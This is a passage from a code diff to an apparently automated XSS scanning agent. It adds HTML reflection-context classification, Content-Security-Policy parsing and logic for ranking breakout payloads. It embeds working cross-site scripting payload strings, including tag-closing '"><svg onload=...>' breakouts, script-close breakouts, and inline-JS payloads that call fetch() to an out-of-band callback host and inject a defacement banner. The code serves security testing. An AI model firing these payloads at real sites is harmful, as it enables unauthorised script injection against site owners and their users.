+    Attributes the PAYLOAD wrote are included by construction. The tokenizer read them as
+    attributes of this element, which is exactly what the browser will do with them, so
+    `" onfocus=... autofocus tabindex="0` focuses the <div> it broke into and keeps
+    confirming.
+
+    `memo` maps an already-resolved region index to its element's names and is what keeps
+    this LINEAR. Without it the answer costs one walk per occurrence, which is quadratic
+    on a response that reflects the payload thousands of times inside ONE tag — measured
+    at 6.6 s for 3k reflections in a single start tag, i.e. the shape that took the whole
+    scan down as the gospider JS-mining ReDoS. Every index the walk crosses is recorded,
+    so the total work is bounded by the tag's own regions however many occurrences land
+    in it.
+    """
+    if idx < 0 or regions[idx][_R_KIND] not in _IN_TAG_KINDS:
+        return ""
+    crossed = []
+    at = idx
+    while True:
+        if at in memo:
+            names = memo[at]
+            break
+        region = regions[at]
+        if (region[_R_KIND] == "tag"
+                and html[region[_R_START]:region[_R_START] + 1] == "<"):
+            names = memo[at] = _tag_name_runs(html, regions, at)
+            break
+        crossed.append(at)
+        prev = at - 1
+        if (prev < 0 or regions[prev][_R_TAG] != region[_R_TAG]
+                or regions[prev][_R_KIND] not in _IN_TAG_KINDS
+                or regions[prev][_R_END] != region[_R_START]):
+            names = ""  # the tag open is not in the map (scan limit / truncation)
+            break
+        at = prev
+    for k in crossed:
+        memo[k] = names
+    return names
+
+
+# PURE
+def _classify_region(region: _HtmlRegion, html: str, start: int, end: int) -> str:
+    """Label the parse context of ONE payload occurrence spanning [start, end)."""
+    kind = region[_R_KIND]
+    region_end = region[_R_END]
+    if kind == "data":
+        return "html_text"
+    if kind == "cdata":
+        # XML / foreign-content CDATA is CHARACTER DATA: markup inside it is not
+        # tokenized, exactly like a raw-text element, and only "]]>" ends it.
+        return "rawtext_breakout" if region_end < end else "rawtext_inert"
+    if kind == "comment":
+        # The region ends AT the terminator, so a payload that closes the comment itself
+        # always runs past it — the same "the token ends inside the payload" rule used
+        # for attribute values and JS strings.
+        return "comment_breakout" if region_end < end else "comment_inert"
+    if kind == "plaintext":
+        return "rawtext_inert"  # nothing can close a <plaintext> element, ever
+    if kind == "rcdata" or kind == "rawtext":
+        if region_end < end:
+            return "rawtext_breakout"  # the payload carries the appropriate end tag
+        if region[_R_TAG] == "script" and region[_R_ATTR] in _JS_SCRIPT_TYPES:
+            region_start = region[_R_START]
+            body = html[region_start:region_end]
+            s, e = start - region_start, end - region_start
+            if not _js_span_escapes(body, s, e):
+                return ("script_dom_sink" if _js_literal_reaches_html_sink(body, s, e)
+                        else "script_js_inert")
+            return ("script_js_breakout" if _js_breakout_parses(body, s, e)
+                    else "script_js_syntax_error")
+        return "rawtext_inert"
+    if kind == "attr_value":
+        if region_end < end:
+            return "attribute_quoted_breakout"  # the payload carries the delimiter
+        if region[_R_ATTR] == "srcdoc":
+            # HTML standard: an <iframe srcdoc="..."> value is parsed as a whole HTML
+            # document, so markup inside it executes without escaping the delimiter.
+            return "attribute_quoted_breakout"
+        return "attribute_quoted_inert"
+    return "attribute_unquoted"  # tag / attribute name / unquoted value → parsed as markup
+
+
+# PURE
+def classify_reflection_positions(html: str, payload: str, xml: bool = False) -> List[str]:
+    """Classify the HTML parse context of EVERY raw occurrence of `payload` in `html`.
+
+    Pure string → data helper (no I/O, no agent state) backing the HTTP confirmation
+    predicate. One label per occurrence, in document order:
+
+      "html_text"                 text position — the payload's tags DO parse
+      "attribute_unquoted"        inside a start tag (attribute name / unquoted value) —
+                                  the payload is parsed as markup/attributes
+      "attribute_quoted_breakout" inside a quoted attribute value the payload CAN escape
+                                  (it carries the raw delimiter quote)
+      "attribute_quoted_inert"    inside a quoted attribute value it cannot escape
+      "rawtext_breakout"          inside an RCDATA/RAWTEXT element (title, textarea,
+                                  script, ...) but the payload carries the close tag
+      "rawtext_inert"             inside an RCDATA/RAWTEXT (or <plaintext>) element,
+                                  no close tag
+      "script_js_breakout"        inside an inline <script> and the payload escapes the
+                                  JS token (string / template / regex / comment) it landed
+                                  in — no markup needed, the JS engine runs it
+      "script_js_inert"           inside an inline <script>, JS token NOT escaped
+      "comment_breakout"          inside an HTML comment the payload closes
+      "comment_inert"             inside an HTML comment it cannot close
+
+      "template_inert"            inside a <template>'s contents, which are parsed into a
+                                  separate document that is never rendered
+      "frameset_inert"            in the part of a frameset document the parser drops
+      "script_js_syntax_error"    the JS token WAS escaped, but the resulting inline
+                                  script no longer compiles, so none of it runs
+
+    A reflection that was HTML-entity-escaped (&lt; / &quot; / &#60;) or percent-encoded
+    inside a URL attribute produces NO raw occurrence by construction, so the result is
+    an empty list — there is nothing that could execute.
+    """
+    return [label for label, _tag, _tail, _host in _reflection_occurrences(html, payload, xml)]
+
+
+# PURE
+def _reflection_occurrences(
+    html: str, payload: str, xml: bool = False
+) -> List[Tuple[str, str, bool, str]]:
+    """(position, owning element, tail-closes, host attribute names) per occurrence.
+
+    The element name is what makes "the payload declared an event handler" answerable:
+    whether that handler can ever fire is a property of the element the server wrote, not
+    of the payload. Its ATTRIBUTE NAMES answer the rest of it — an element is a focusable
+    area, and therefore reachable by `onfocus`, partly by name and partly by attribute.
+    `tail-closes` is whether a '>' exists in the response AFTER the occurrence, which is
+    what decides whether a tag the payload opened is ever closed.
+    """
+    if not html or not payload or payload not in html:
+        return []  # cheap early-out: most bombed payloads never reflect at all
+    width = len(payload)
+    # Nothing past the LAST occurrence can change a single label, so the tokenizer is
+    # told where to stop. On the common shape — a search term echoed near the top of a
+    # long listing page — that is most of the document not scanned at all.
+    regions, starts, inert, frameset = _html_index(
+        html, html.rfind(payload) + width, xml)
+    out: List[Tuple[str, str, bool, str]] = []
+    # Resolved region index -> owning start tag's attribute names, shared across every
+    # occurrence so a page that reflects the payload once per attribute of one huge tag
+    # costs one walk over that tag, not one per occurrence.
+    hosts: Dict[int, str] = {}
+    at = html.find(payload)
+    while at != -1:
+        end = at + width
+        tail = html.find(">", end) != -1
+        if inert and _in_inert_subtree(inert, at, end):
+            out.append(("template_inert", "", tail, ""))
+            at = html.find(payload, at + 1)
+            continue
+        # A reflection at offset 0 begins where the tokenizer is unambiguously in DATA
+        # state — there is nothing before it to have changed that. Resolving a region AT
+        # offset 0 instead finds the tag the PAYLOAD ITSELF opened and reads the payload
+        # as sitting inside its own attribute, so `<svg onload=alert(1)>` returned as the
+        # whole body scored `attribute_unquoted` and was dropped. That also killed the
+        # <iframe srcdoc> rescue, whose decoded value IS the payload and nothing else.
+        idx = _region_index_at(regions, starts, at, html) if at else -1
+        # No region means the tokenizer never reached this offset: unknown state, so fail
+        # OPEN and call it a text position rather than silently dropping the reflection.
+        region = regions[idx] if idx >= 0 else None
+        label = _classify_region(region, html, at, end) if region is not None else "html_text"
+        # In a frameset document the tree builder throws away every character token after
+        # the <frameset>; the <frame> elements' own attributes still work, so only the
+        # TEXT positions are dropped.
+        if frameset >= 0 and at >= frameset and label in _TEXT_REFLECTION_POSITIONS:
+            label = "frameset_inert"
+        out.append((label, region[_R_TAG] if region is not None else "", tail,
+                    _host_attribute_names(html, regions, idx, hosts)))
+        at = html.find(payload, at + 1)
+    return out
+
+
+# =============================================================================
+# REFLECTION CONTEXT RANKING + CONTEXT-AWARE BREAKOUTS (PURE)
+# =============================================================================
+# (element, attribute) pairs whose processing model is NAVIGATE. A `javascript:` URL is
+# only ever evaluated by the navigate algorithm; every other URL attribute FETCHES its
+# URL, and a javascript: fetch fails silently. That is the whole difference between
+# <a href="javascript:…"> (runs) and <img src="javascript:…"> / <object data=…> /
+# <video poster=…> / <blockquote cite=…> / <link href=…> (measurably inert in Chromium).
+# The pair — not the bare attribute name — is what decides it, so `src` on an <iframe>
+# navigates while `src` on an <img> does not.
+_NAVIGATING_URL_ATTRIBUTES = frozenset({
+    ("a", "href"), ("a", "xlink:href"),
+    ("area", "href"), ("area", "xlink:href"),
+    ("form", "action"),
+    ("button", "formaction"), ("input", "formaction"),
+    ("iframe", "src"), ("frame", "src"),
+})
+
+# URL standard, "basic URL parser": every ASCII tab and newline is removed from the input
+# before it is parsed, so `java&#09;script:` is the javascript: scheme.
+_URL_TAB_STRIP = {0x09: None, 0x0A: None, 0x0D: None}
+
+# Response media types a browser parses as a SCRIPTABLE document. Everything else is
+# rendered as data, so a reflection in it cannot execute. SVG belongs here: navigating to
+# an image/svg+xml response runs its scripts, and suppressing it would drop a real finding.
+_EXECUTABLE_CONTENT_TYPES = frozenset({
+    "text/html", "application/xhtml+xml", "image/svg+xml",
+})
+
+# The subset of those that a browser hands to an XML parser rather than the HTML parser.
+_XML_CONTENT_TYPES = frozenset({"application/xhtml+xml", "image/svg+xml"})
+
+# =============================================================================
+# CONTENT SECURITY POLICY (PURE)
+# =============================================================================
+# Every payload this agent ships is INLINE — an inline <script>, an on<event> attribute or
+# a javascript: URL. CSP Level 3 governs all three through the same fallback chains, so a
+# policy that forbids inline script makes the reflection unexploitable by anything we can
+# send, and Chromium refuses to run it. Only the ENFORCING header counts:
+# Content-Security-Policy-Report-Only blocks nothing by definition.
+#
+# The two chains are evaluated SEPARATELY and the answer is their AND, so the gate only
+# goes quiet when the policy blocks BOTH the element and the attribute vector. Anything we
+# cannot parse leaves the policy silent, which means "not blocked" — fail OPEN, as
+# everywhere else in this file.
+_CSP_INLINE_CHAINS = (
+    ("script-src-elem", "script-src", "default-src"),   # injected <script> elements
+    ("script-src-attr", "script-src", "default-src"),   # injected on<event> / javascript:
+)
+_CSP_HASH_PREFIXES = ("'nonce-", "'sha256-", "'sha384-", "'sha512-")
+# Cheap C-level pre-filter for the in-document policy: no http-equiv, no meta CSP.
+_META_HTTP_EQUIV_RE = re.compile(r"http-equiv", re.IGNORECASE)
+# Attribute-name marker for the `content` of a CSP <meta>, so the policy can be recovered
+# from the region map without a second parse of the document.
+_META_CSP_ATTR = "content" + _ELEMENT_STATE_SEP + "csp"
+
+
+# PURE
+def _csp_chain_blocks(directives: Dict[str, List[str]], chain: Tuple[str, ...]) -> bool:
+    """True when the first directive of `chain` that is present forbids inline script."""
+    for name in chain:
+        sources = directives.get(name)
+        if sources is None:
+            continue
+        if "'unsafe-inline'" not in sources:
+            return True
+        # CSP3: a nonce or hash source expression makes 'unsafe-inline' INERT for script,
+        # and an injected inline script can never carry the right nonce.
+        return any(s.startswith(_CSP_HASH_PREFIXES) for s in sources)
+    return False  # nothing in this policy governs script
+
+
+# PURE
+@lru_cache(maxsize=8)
+def _csp_blocks_inline(policy: str) -> bool:
+    """True when `policy` (one or more comma-separated policies) forbids inline script."""
+    if not policy or not policy.strip():
+        return False
+    try:
+        for one in policy.split(","):
+            directives: Dict[str, List[str]] = {}
+            for serialized in one.split(";"):
+                parts = serialized.split()
+                if parts and parts[0].lower() not in directives:
+                    directives[parts[0].lower()] = [p.lower() for p in parts[1:]]
+            if all(_csp_chain_blocks(directives, chain) for chain in _CSP_INLINE_CHAINS):
+                return True
+    except Exception:  # unparseable policy → fail OPEN
+        return False
+    return False
+
+
+# PURE
+def _document_csp(html: str) -> str:
+    """The policies the DOCUMENT declares via <meta http-equiv="Content-Security-Policy">.
+
+    Equally enforcing as the header (a meta policy cannot be report-only), and the one a
+    static page can carry without any server configuration at all.
+    """
+    if not html or _META_HTTP_EQUIV_RE.search(html) is None:
+        return ""
+    regions, _starts, _inert, _fs = _html_index(html, len(html), False)
+    return ",".join(
+        html_module.unescape(html[r[_R_START]:r[_R_END]])
+        for r in regions if r[_R_ATTR] == _META_CSP_ATTR)
+
+
+# Every module-level memo whose KEY is a response body (or a span of one). Each entry
+# therefore pins whole documents alive for as long as the process lives, and the API
+# runs as a long-lived FastAPI worker across many scans — so without an explicit release
+# the last documents of every scan ever run stay resident forever.
+#
+# Registered here rather than cleared one-by-one at the call site so that adding a cache
+# cannot silently reintroduce the leak: the release walks THIS tuple.
+_DOCUMENT_CACHES = (
+    _js_tokens,
+    _js_index,
+    _attribute_candidates,
+    _html_index,
+    _csp_blocks_inline,
+)
+
+
+def release_document_caches() -> Dict[str, int]:
+    """Drop every cached response body. Returns each cache's size before clearing.
+
+    Call at PIPELINE EXIT ONLY. These memos are what make the confirmation rungs cheap —
+    the four checks run back-to-back over one body, and consecutive non-reflecting probes
+    share an identical body — so clearing mid-scan would re-parse documents the scan is
+    still working on. At exit there is nothing left to hit, and the entries are pure
+    retention.
+
+    Purely a memory operation: an lru_cache is semantically transparent, so clearing it
+    can change timing but never a verdict.
+    """
+    sizes = {fn.__name__: fn.cache_info().currsize for fn in _DOCUMENT_CACHES}
+    for fn in _DOCUMENT_CACHES:
+        fn.cache_clear()
+    return sizes
+
+
+# Most-exploitable-first ranking, used to pick ONE label when a parameter reflects in
+# several places at once (very common: a search term echoed into <title>, into an
+# <input value="..."> AND into the page body). Returning the first hit — as the previous
+# implementation did — hid the exploitable reflection behind an inert one.
+_CONTEXT_EXPLOITABILITY = (
+    "script",           # JS execution context
+    "event_handler",    # attribute value that IS JavaScript
+    "html_text",        # tags parse here
+    "attribute_value",  # needs a quote breakout
+    "style",            # CSS context
+    "comment",
+    "tag_name",
+    "url_context",      # browser-only (click / navigation)
+    "raw_text",         # RCDATA/RAWTEXT — needs the matching close tag
+)
+
+# Contexts `_is_payload_relevant()` has a filtering rule for. Any other label falls back
+# to the broad payload set instead of the 10-payload safety net: never cut recall on a
+# context we simply have no rule for.
+_FILTERABLE_CONTEXTS = frozenset({
+    "script", "html_text", "attribute_value", "comment", "style", "tag_name",
+})
+
+# DASTySAST measures the reflection context during triage, but names it in an OLDER
+# vocabulary than the one ranked above. Translating ON ARRIVAL keeps a single canonical
+# name set instead of teaching every consumer both dialects.
+_PROBE_CONTEXT_ALIASES = {
+    "script_block": "script",
+    "html_attribute": "attribute_value",
+}
+
+
+# PURE
+def canonical_probe_context(label: str) -> str:
+    """A DASTySAST probe label in THIS agent's vocabulary, or "" if it carries no measurement.
+
+    "" for no_reflection / error / response_header and for anything unrecognised. An
+    unmapped label must never be passed through: it would match no branch in the ladder
+    and behave exactly like the "html" placeholder it exists to replace — a wrong label
+    that looks like information is worse than an honest absence.
+    """
+    label = (label or "").strip().lower()
+    if label in _CONTEXT_EXPLOITABILITY:
+        return label
+    return _PROBE_CONTEXT_ALIASES.get(label, "")
+
+# Map this agent's reflection-context vocabulary onto the shared ReflectionContext table
+# so breakout prefixes keep ONE definition (tools/manipulator/context_analyzer).
+#
+# FIVE independent label vocabularies reach the breakout helpers below:
+#   reflection analyser  : script, style, html_text, raw_text, attribute_value,
+#                          event_handler, url_context, comment, tag_name, unknown, blocked
+#   HTML position class. : rawtext_inert, rawtext_breakout, attribute_quoted_inert,
+#                          attribute_quoted_breakout, attribute_unquoted, comment_inert, ...
+#   LLM / DRY dedup      : html_body, attribute, javascript, url, css
+#   execution evidence   : html_tag, event_handler, javascript_uri, script_block,
+#                          template_expression, js_string_breakout
+#   whatever an LLM invents, because the DRY label is model output, not a closed set.
+# Matching is therefore done on the label's WORD TOKENS (universal parse-state names), not
+# on the label as a whole, so "attribute_quoted_inert", "script_block" and
+# "js-template-literal" all resolve without being enumerated anywhere.
+_CONTEXT_TOKEN_KEYS = {
+    # JavaScript execution / JS string literals
+    "script": (ReflectionContext.SCRIPT_TAG, ReflectionContext.JAVASCRIPT_STRING_SINGLE,
+               ReflectionContext.JAVASCRIPT_STRING_DOUBLE, ReflectionContext.JAVASCRIPT_TEMPLATE),
+    "javascript": (ReflectionContext.SCRIPT_TAG, ReflectionContext.JAVASCRIPT_STRING_SINGLE,
+                   ReflectionContext.JAVASCRIPT_STRING_DOUBLE, ReflectionContext.JAVASCRIPT_TEMPLATE),
+    "js": (ReflectionContext.SCRIPT_TAG, ReflectionContext.JAVASCRIPT_STRING_SINGLE,
+           ReflectionContext.JAVASCRIPT_STRING_DOUBLE, ReflectionContext.JAVASCRIPT_TEMPLATE),
+    "string": (ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
+    "literal": (ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
+    # HTML attribute values (an event handler IS an attribute value that holds JS)
+    "attribute": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE),
+    "attr": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE),
+    "event": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE,
+              ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
+    "handler": (ReflectionContext.HTML_ATTRIBUTE_DOUBLE, ReflectionContext.HTML_ATTRIBUTE_SINGLE,
+                ReflectionContext.JAVASCRIPT_STRING_SINGLE, ReflectionContext.JAVASCRIPT_STRING_DOUBLE),
+    # Document body / any position parsed as markup
+    "body": (ReflectionContext.HTML_TAG_BODY,),
+    "text": (ReflectionContext.HTML_TAG_BODY,),
+    "rawtext": (ReflectionContext.HTML_TAG_BODY,),
+    "rcdata": (ReflectionContext.HTML_TAG_BODY,),
+    "tag": (ReflectionContext.HTML_TAG_BODY,),
+    "html": (ReflectionContext.HTML_TAG_BODY,),
+    "markup": (ReflectionContext.HTML_TAG_BODY,),
+    "dom": (ReflectionContext.HTML_TAG_BODY,),
+    "element": (ReflectionContext.HTML_TAG_BODY,),
+    # URL-bearing attribute values
+    "url": (ReflectionContext.URL_PARAMETER,),
+    "uri": (ReflectionContext.URL_PARAMETER,),
+    "href": (ReflectionContext.URL_PARAMETER,),
+    "src": (ReflectionContext.URL_PARAMETER,),
+    "link": (ReflectionContext.URL_PARAMETER,),
+    "location": (ReflectionContext.URL_PARAMETER,),
+    "redirect": (ReflectionContext.URL_PARAMETER,),
+    # Remaining parse states
+    "comment": (ReflectionContext.HTML_COMMENT,),
+    "style": (ReflectionContext.STYLE_TAG,),
+    "css": (ReflectionContext.STYLE_TAG,),
+    "json": (ReflectionContext.JSON_STRING,),
+    "template": (ReflectionContext.TEMPLATE_ENGINE, ReflectionContext.JAVASCRIPT_TEMPLATE),
+    "interpolation": (ReflectionContext.TEMPLATE_ENGINE,),
+    "mustache": (ReflectionContext.TEMPLATE_ENGINE,),
+}
+
+# The SAFE SUPERSET every label gets, matched tokens or not: body + both attribute
+# families cover the common reflection shapes without assuming anything about the target.
+# INVARIANT: an unrecognised (or plain wrong) context label must NEVER mean "fire fewer
+# payloads" — it is only ever allowed to mean "fire the broad set". Keep it that way.
+_CONTEXT_FALLBACK_KEYS = (
+    ReflectionContext.HTML_TAG_BODY,
+    ReflectionContext.HTML_ATTRIBUTE_DOUBLE,
+    ReflectionContext.HTML_ATTRIBUTE_SINGLE,
+)
+
+# Emission order of the matched keys: most context-specific / most likely to execute
+# first, so that a downstream slice keeps the highest-value prefixes.
+_CONTEXT_KEY_ORDER = (
+    ReflectionContext.SCRIPT_TAG,
+    ReflectionContext.JAVASCRIPT_STRING_SINGLE,
+    ReflectionContext.JAVASCRIPT_STRING_DOUBLE,
+    ReflectionContext.JAVASCRIPT_TEMPLATE,
+    ReflectionContext.HTML_ATTRIBUTE_DOUBLE,
+    ReflectionContext.HTML_ATTRIBUTE_SINGLE,
+    ReflectionContext.HTML_TAG_BODY,
+    ReflectionContext.HTML_COMMENT,
+    ReflectionContext.STYLE_TAG,
+    ReflectionContext.TEMPLATE_ENGINE,
+    ReflectionContext.JSON_STRING,
+    ReflectionContext.URL_PARAMETER,
+)
+
+# Explicit L3 request budget for the CONTEXT-specific prefixes. L3 fires
+# (1 + len(prefixes)) requests per LLM payload and _ask_deepseek_visual_payloads() returns
+# at most 10, so the merged list sets L3's cost directly: 10 x (1 + N). The globally
+# ranked prefixes are never counted against this budget — dropping one of those is a
+# straight capability loss (see merge_breakout_prefixes). 56 sits above the longest union
+# the shared CONTEXT_BREAKOUTS table can produce for any label today (measured worst case
+# 50, typical 21-40), so it currently truncates nothing and no prefix that ever fired can
+# be lost to it. It is a GUARD: growing that shared table cannot silently multiply L3
+# traffic without someone raising this number on purpose.
+_L3_CONTEXT_PREFIX_BUDGET = 56
+
+
+# PURE
+def most_exploitable_context(contexts: List[str]) -> str:
+    """Pick the most exploitable label out of every context a probe reflected in."""
+    for label in _CONTEXT_EXPLOITABILITY:
+        if label in contexts:
+            return label
+    for label in contexts:
+        if label:
+            return label
+    return "unknown"
+
+
+# PURE
+def _dedup_prefixes(prefixes: List[str]) -> List[str]:
+    """Order-preserving dedup that drops empty/whitespace-only prefixes.
+
+    prefix+payload == payload for an empty prefix, so those only burn requests.
+    """
+    seen: set = set()
+    out: List[str] = []
+    for prefix in prefixes or ():
+        if not prefix or not prefix.strip() or prefix in seen:
+            continue
+        seen.add(prefix)
+        out.append(prefix)
+    return out
+
+
+# PURE
+def context_reflection_keys(context: str) -> Tuple[ReflectionContext, ...]:
+    """Normalise ANY context label onto the shared ReflectionContext table.
+
+    ONE mapping for every label vocabulary that can reach the breakout helpers (see
+    _CONTEXT_TOKEN_KEYS). The label is split into word tokens and every token that names a
+    parse state contributes its keys; the SAFE SUPERSET (_CONTEXT_FALLBACK_KEYS) is then
+    appended unconditionally.
+
+    INVARIANT — an unrecognised label degrades to a SUPERSET, never to a smaller set. A
+    label from the "wrong" vocabulary (an LLM-invented DRY label, a position-classifier
+    label) must never silently reduce what gets fired: fail OPEN on uncertainty.
+    """
+    tokens = set(re.split(r"[^a-z0-9]+", (context or "").lower()))
+    matched = {
+        key
+        for token in tokens
+        for key in _CONTEXT_TOKEN_KEYS.get(token, ())
+    }
+    ordered = tuple(k for k in _CONTEXT_KEY_ORDER if k in matched)
+    return ordered + tuple(k for k in _CONTEXT_FALLBACK_KEYS if k not in matched)
+
+
+# PURE
+def context_breakout_prefixes(context: str, surviving_chars: str = "") -> List[str]:
+    """Breakout prefixes the shared context table prescribes for a reflection context.
+
+    `surviving_chars` (from the L0.5 character probe) only narrows the attribute families:
+    if the response proves the double quote survives we keep the '"' family (which is
+    where the '">' tag-closing breakout lives) and drop the single-quote one, and vice
+    versa. Empty `surviving_chars` means "unknown" → keep both. It deliberately does NOT
+    narrow the JS-string families: those breakouts (\\' , \\") exist precisely for the
+    server that escapes the raw quote away.
+    """
+    prefixes: List[str] = []
+    for key in context_reflection_keys(context):
+        if surviving_chars:
+            if key is ReflectionContext.HTML_ATTRIBUTE_DOUBLE and '"' not in surviving_chars:
+                continue
+            if key is ReflectionContext.HTML_ATTRIBUTE_SINGLE and "'" not in surviving_chars:
+                continue
+        prefixes.extend(ContextAnalyzer.CONTEXT_BREAKOUTS.get(key, []))
+    return _dedup_prefixes(prefixes)
+
+
+# PURE
+def merge_breakout_prefixes(
+    context_prefixes: List[str], global_prefixes: List[str],
+    context_budget: int = _L3_CONTEXT_PREFIX_BUDGET,
+) -> List[str]:
+    """Union context-appropriate breakouts with the globally-ranked ones. ADDITIVE.
+
+    The global ranking is sorted by success_count ALONE (no context, no surviving-chars
+    filter), so a breakout that actually fits the detected context can fall outside its
+    limit and never be tried — that is why the context list is unioned in. But capping the
+    UNION is just as damaging in the other direction: the context list eats the whole cap
+    and globally ranked prefixes that used to fire fall off the end (the JS-string
+    breakouts \\' and \\'; , the CSTI one {{ ...). So EVERY global prefix is kept, and the
+    bound applies only to the context contribution.
+
+    The two rankings are then interleaved, context first (it carries the stronger,
+    response-derived evidence), so that ANY downstream slice keeps the head of BOTH.
+    """
+    ctx = _dedup_prefixes(context_prefixes)[:max(0, context_budget)]
+    glob = _dedup_prefixes(global_prefixes)
+    merged: List[str] = []
+    seen: set = set()
+    for i in range(max(len(ctx), len(glob))):
+        for source in (ctx, glob):
+            if i < len(source) and source[i] not in seen:
+                seen.add(source[i])
+                merged.append(source[i])
+    return merged
+
+
+# PURE
+def tag_closing_breakout_payloads(
+    context: str, surviving_chars: str, smart_payloads: Dict[str, str]
+) -> List[str]:
+    """Deterministic tag-closing candidates — emitted for EVERY context label.
+
+    L3 only ever fires LLM payloads multiplied by breakout prefixes, so when the LLM does
+    not propose a tag-closing payload AND the '">' prefix falls outside the global
+    ranking cut, the whole '"><svg onload=...>' family is unreachable. These candidates
+    make it reachable. They keep the silent document.title probe convention so the
+    report-time upgrade (reporting_mod.finding_processor.upgrade_payload) still
+    recognises them and swaps in the visual banner PoC.
+
+    INVARIANT — the context LABEL must never subtract. `context` reaches here from any of
+    the vocabularies listed on _CONTEXT_TOKEN_KEYS, so allow-listing labels meant an
+    unrecognised one yielded ZERO payloads, i.e. silently disabled the very fix this
+    function is. It is only ever read to ADD (a script-context label also gets the
+    </script> close-tag breakout, the RAWTEXT equivalent of '">'). The only subtraction is
+    `surviving_chars`, which is MEASURED from the response, not guessed from a label: a
+    quote the server provably encodes cannot close the tag. Unknown ⇒ fire everything.
+    """
+    keys = []
+    if not surviving_chars or '"' in surviving_chars:
+        keys.append("attr_dq_tag_breakout")
+    if not surviving_chars or "'" in surviving_chars:
+        keys.append("attr_sq_tag_breakout")
+    if ReflectionContext.SCRIPT_TAG in context_reflection_keys(context):
+        if not surviving_chars or "<" in surviving_chars:
+            keys.append("script_breakout")
+    return [p for p in (smart_payloads.get(k, "") for k in keys) if p]
+
+
 from bugtrace.agents.base import BaseAgent
 
 class XSSAgent(BaseAgent, TechContextMixin):
@@ -344,8 +2413,6 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "\\\");fetch('https://{{interactsh_url}}');(function(){var b=document.createElement('div');b.id='bt-pwn';b.style='background:red;color:white;text-align:center;padding:10px;position:fixed;top:0;left:0;width:100%;z-index:9999;font-weight:bold;';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})();//",
         # Unicode breakout with Visual Banner
         "\\u0022);fetch('https://{{interactsh_url}}');var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);//",
-        # Autofocus bypass with Visual Banner (bypasses 'on')
-        "\" autofocus focus=var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b) x=\"",
         # Template literal with Visual Banner
         "\\`+fetch('https://{{interactsh_url}}')+(function(){var b=document.createElement('div');b.id='bt-pwn';b.innerText='HACKED BY BUGTRACEAI';document.body.prepend(b);})()+\\`",
         
@@ -391,6 +2458,12 @@ class XSSAgent(BaseAgent, TechContextMixin):
         "html_img": "<img src=x onerror=document.title=document.domain>",
         "attr_dq_breakout": "\" onmouseover=document.title=document.domain x=\"",
         "attr_sq_breakout": "' onmouseover=document.title=document.domain x='",
+        # Tag-closing attribute breakouts: the '">' family. The "x=" variants above only
+        # add an event handler to the HOST tag, which is useless inside a tag that never
+        # fires one (<meta>, <link>, <input type=hidden>); closing the tag and injecting a
+        # fresh one always executes.
+        "attr_dq_tag_breakout": "\"><svg onload=document.title=document.domain>",
+        "attr_sq_tag_breakout": "'><svg onload=document.title=document.domain>",
         "script_breakout": "</script><script>document.title=document.domain</script>",
     }
 
@@ -418,6 +2491,12 @@ class XSSAgent(BaseAgent, TechContextMixin):
         # Flow: HTTP → Playwright (L3) → VALIDATED_CONFIRMED
         self.verifier = XSSVerifier(headless=headless, prefer_cdp=False)
         self.payload_learner = PayloadLearner()
+
+        # NEGATIVE EVIDENCE: one closed record per parameter the escalation ladder touched,
+        # so "tested hard, nothing executable" stops being indistinguishable from
+        # "never tested". _xss_cov is the record currently open (None between parameters).
+        self._xss_coverage: List[xss_coverage.ParamCoverage] = []
+        self._xss_cov: Optional[xss_coverage.ParamCoverage] = None
 
         # Results
         self.findings: List[XSSFinding] = []
@@ -1014,7 +3093,7 @@ class XSSAgent(BaseAgent, TechContextMixin):
         # All checks passed
         return True, ""
 
-    def _emit_xss_finding(self, finding_dict: Dict, status: str = None, needs_cdp: bool = False):
+    def _emit_xss_finding(self, finding_dict: Dict, status: str = None, needs_cdp: bool = False) -> bool:
         """
         Helper to emit XSS finding using BaseAgent.emit_finding() with validation.
 
@@ -1022,6 +3101,12 @@ class XSSAgent(BaseAgent, TechContextMixin):
             finding_dict: The nested 'finding' dict with type, url, parameter, payload, etc.
             status: Validation status (e.g., "VALIDATED_CONFIRMED")
             needs_cdp: Whether finding needs CDP validation
+
+        Returns:
+            True if the finding passed `_validate_before_emit` and was emitted;
+            False if it was rejected. Callers MUST branch on this before logging
+            success — a rejected finding never reaches the event bus, and a log
+            line that claims otherwise makes the drop invisible.
         """
         # Wrap in full event structure
         full_event = {
@@ -1035,11 +3120,14 @@ class XSSAgent(BaseAgent, TechContextMixin):
         # Use BaseAgent.emit_finding() which validates before emitting
         result = self.emit_finding(finding_dict)
 
-        if result:
-            # Emit the full event structure for backward compatibility
-            from bugtrace.core.event_bus import EventType
-            if settings.WORKER_POOL_EMIT_EVENTS:
-                asyncio.create_task(self.event_bus.emit(EventType.VULNERABILITY_DETECTED, full_event))
+        if not result:
+            return False
+
+        # Emit the full event structure for backward compatibility
+        from bugtrace.core.event_bus import EventType
+        if settings.WORKER_POOL_EMIT_EVENTS:
+            asyncio.create_task(self.event_bus.emit(EventType.VULNERABILITY_DETECTED, full_event))
+        return True
 
     async def _capture_proof_screenshot(self, finding_dict: Dict) -> None:
         """Best-effort: capture a real browser screenshot of a confirmed XSS PoC.
@@ -3556,7 +5644,12 @@ Return ONLY the payloads, one per line, no explanations."""
         # Now deduplicate the expanded list
         try:
             dry_list = await self._llm_analyze_and_dedup(expanded_wet_findings, self._scan_context)
-        except:
+        except Exception:
+            # `except Exception`, NOT a bare `except`. _llm_analyze_and_dedup already handles
+            # its own Exception and returns the fingerprint fallback, so a bare clause here
+            # could only ever catch what Exception does not: CancelledError / KeyboardInterrupt.
+            # Swallowing those meant the operator pressing Stop mid-dedup was ignored and the
+            # full exploitation ladder then ran against a target they had asked us to leave alone.
